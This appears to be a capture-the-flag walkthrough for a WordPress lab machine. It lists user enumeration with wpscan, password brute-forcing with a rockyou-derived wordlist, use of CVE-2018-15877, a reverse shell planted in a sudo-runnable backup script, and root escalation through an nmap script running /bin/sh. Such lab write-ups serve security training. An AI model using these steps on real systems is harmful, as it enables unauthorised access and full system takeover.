#found wordpress on port 80

#ran wpscan to enumerate users:
	admin
	graham
	jens
	sarah
	mark

#made a wordlist as told in the hint:
	cat ~/Desktop/rockyou.txt | grep k01 > pass.txt

#ran brute force using wpscan

#found pass:
	mark:helpdesk01

#enumerated and saw activity monitor plugin installed

#used an exploit CVE-2018-15877

#changed ip, port, removed -lvnp

#got shell

#found txt file in mark directory
	Things to do:

	- Restore full functionality for the hyperdrive (need to speak to Jens)
	- Buy present for Sarah's farewell party
	- Add new user: graham - GSo7isUM1D4 - done
	- Apply for the OSCP course
	- Buy new laptop for Sarah's replacement

#dropped in grahams

#sudo -l shows we can use backups.sh using jens

#added a rev shell one liner in it

#used the command:
	sudo -u jens /home/jens/backups.sh

#got a shell on jens

#sudo -l shows nmap can be run as root

#used the command:
	TF=$(mktemp)
	echo 'os.execute("/bin/sh")' > $TF
	sudo nmap --script=$TF

#got root!